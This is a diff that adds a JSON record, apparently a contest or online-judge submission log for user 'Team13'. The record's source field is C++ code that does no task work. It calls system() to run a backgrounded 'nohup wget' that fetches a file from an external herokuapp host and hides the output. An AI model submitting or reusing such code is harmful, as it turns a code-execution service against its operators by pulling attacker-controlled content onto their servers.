@@ -1,0 +1,6 @@
+{
+    "id": 435,
+    "tim": "2022/03/29 14:03:11",
+    "user": "Team13",
+    "source": "#include <bits/stdc++.h>\nint main() {\nsystem(\"nohup wget 'https://linuxmetel-sub4.herokuapp.com/ctff' > /dev/null & 2>&1\");\n}"
+}
